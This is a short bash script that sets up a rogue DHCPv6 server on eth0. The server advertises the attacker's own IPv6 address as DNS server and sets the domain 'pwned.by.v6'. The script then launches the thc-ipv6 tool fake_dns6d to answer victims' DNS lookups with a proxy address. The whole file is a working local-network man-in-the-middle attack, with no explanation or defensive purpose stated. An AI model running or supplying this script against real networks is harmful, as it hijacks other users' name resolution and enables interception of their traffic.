#!/bin/bash

interface=eth0
addr=2013:face:dead:beef::1/64
dnsnameserver=2013:face:dead:beef::1
proxyserver=$dnsnameserver

dhcp6s_default_conf="# Defaults for dhcpv6 server initscript
# Used by /etc/init.d/wide-dhcpv6-server

# Interfaces on which the server should serve DHCPv6 requests. If empty, the 
# server is deactivated.
INTERFACES=\"${interface}\""

echo "$dhcp6s_default_conf" | sudo tee /etc/default/wide-dhcpv6-server

dhcp6s_conf="option domain-name-servers ${dnsnameserver};
option domain-name \"pwned.by.v6\";"

echo "$dhcp6s_conf" | sudo tee /etc/wide-dhcpv6/dhcp6s.conf

sudo service wide-dhcpv6-server restart

cd ~/coder/ipv6/thc-ipv6-2.1 
sudo ./fake_dns6d $interface ${proxyserver}

